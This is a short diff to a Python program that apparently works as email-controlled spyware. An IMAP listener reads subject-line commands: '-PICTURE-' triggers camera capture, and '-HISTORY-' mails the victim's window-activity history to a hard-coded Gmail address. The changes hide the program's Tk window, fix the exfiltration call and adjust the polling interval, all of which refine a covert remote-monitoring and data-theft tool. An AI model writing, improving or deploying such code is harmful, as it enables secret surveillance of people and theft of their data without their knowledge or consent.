@@ -13,7 +13,9 @@ def show_popup(message):
     root = tk.Tk()
 
     # Show the popup message box
+    root.withdraw()
     messagebox.showinfo("Popup Message", message)
+    
 
     # Destroy the root window and exit the program
     root.destroy()
@@ -52,7 +54,7 @@ def email_listener(username, password):
                         elif "-PICTURE-" == subject:
                             CameraCapture()
                         elif "-HISTORY-" == subject:
-                            WindowMonitoring.send_email(email_sender, 
+                            WindowMonitoring.send_email(WindowMonitoring, email_sender, 
                             email_password, 
                             "projektykandl@gmail.com",
                             f"Window History",
@@ -61,7 +63,7 @@ def email_listener(username, password):
                             )
 
             # Sleep to wait before checking for new emails again
-            time.sleep(5)
+            time.sleep(10)
 
         except imaplib.IMAP4.abort as e:
             print(f"IMAP error occurred: {e}")
@@ -73,5 +75,6 @@ def email_listener(username, password):
                 mail.logout()
             except Exception as e:
                 print(f"Error occurred while logging out: {e}")
+
 
 
